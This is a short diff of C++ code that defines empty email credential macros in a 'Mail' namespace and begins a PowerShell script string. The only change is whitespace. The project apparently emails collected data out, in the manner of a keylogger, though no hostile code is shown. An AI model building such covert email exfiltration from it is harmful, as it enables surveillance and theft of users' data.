@@ -14,7 +14,7 @@
 namespace Mail{
     #define X_EM_TO ""       // Specify an email
     #define X_EM_FROM ""
-    #define X_EM_PASS ""                     // Logs into my own email account
+    #define X_EM_PASS ""     // Logs into my own email account
 
     // Long powershell script
     const std::string &PowerShellScript =
